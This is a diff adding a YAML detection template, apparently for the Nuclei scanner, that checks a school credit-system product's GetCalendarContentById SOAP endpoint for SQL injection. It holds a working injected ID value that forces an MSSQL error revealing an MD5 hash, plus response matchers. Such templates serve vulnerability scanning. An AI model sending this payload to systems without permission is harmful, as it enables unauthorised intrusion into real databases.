@@ -1,0 +1,42 @@
+id: poc-yaml-credit-system-getcalendarcontentbyid-sqli
+info:
+  name: 学分制系统 GetCalendarContentById SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the GetCalendarContentById function of 学分制系统.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /WebService_PantoSchool.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=utf-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <tem:GetCalendarContentById>
+          <tem:ID>1' OR 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))) AND '1'='1</tem:ID>
+        </tem:GetCalendarContentById>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
